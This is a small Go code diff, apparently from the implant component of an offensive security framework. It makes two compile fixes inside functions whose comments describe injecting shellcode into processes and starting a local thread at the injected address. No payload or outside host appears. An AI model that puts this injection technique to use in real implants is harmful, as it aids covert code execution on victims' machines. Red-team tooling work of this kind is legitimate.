@@ -150,6 +150,7 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 		uintptr(old),
 		uintptr(unsafe.Pointer(&old)),
 	)
+	return nil
 }
 
 // injectTask - Injects shellcode into a process handle
@@ -240,7 +241,7 @@ func LocalTask(data []byte) error {
 	// {{if .Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
-	_, _, err := procCreateThread.Call(0, 0, addr, 0, 0, 0)
+	_, _, err = procCreateThread.Call(0, 0, addr, 0, 0, 0)
 	return err
 }
 
